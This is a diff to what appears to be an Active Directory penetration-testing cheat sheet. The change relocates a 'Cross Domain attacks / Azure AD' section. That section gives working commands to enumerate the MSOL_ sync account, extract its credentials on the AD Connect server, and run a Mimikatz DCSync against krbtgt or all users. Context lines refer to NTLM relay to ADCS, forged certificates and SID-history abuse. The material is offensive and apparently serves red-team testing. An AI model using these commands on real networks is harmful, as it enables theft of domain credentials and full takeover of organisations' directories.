@@ -1360,29 +1360,6 @@ ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --n
 #### Ouput should give a TGT which can be used with S4U2self
 - LINK TO S4U2self
  
-## Cross Domain attacks
-## Azure AD
-#### Enumerate where PHS AD connect is installed
-```
-Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
-```
-
-#### On the AD connect server extract MSOL_ Credentials
-```
-.\adconnect.ps1
-```
-
-#### Run cmd as MSOL_
-```
-runas /user:<DOMAIN>\<USER> /netonly cmd
-```
-
-#### Execute DCSync
-- use ```/all``` instead of ```/user``` to list all users
-```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
-```
-
 ### Forged Certificates
 #### Dump the private keys
 - Execute on the CA server. You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.
@@ -1416,7 +1393,29 @@ cat cert.pfx | base64 -w 0
  
 #### Then load TGT and request TGS or access systems as this user.
  
- 
+## Cross Domain attacks
+## Azure AD
+#### Enumerate where PHS AD connect is installed
+```
+Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
+```
+
+#### On the AD connect server extract MSOL_ Credentials
+```
+.\adconnect.ps1
+```
+
+#### Run cmd as MSOL_
+```
+runas /user:<DOMAIN>\<USER> /netonly cmd
+```
+
+#### Execute DCSync
+- use ```/all``` instead of ```/user``` to list all users
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
+```
+
 ## Child to Forest Root
 ### Trust key
 - Abuses SID History
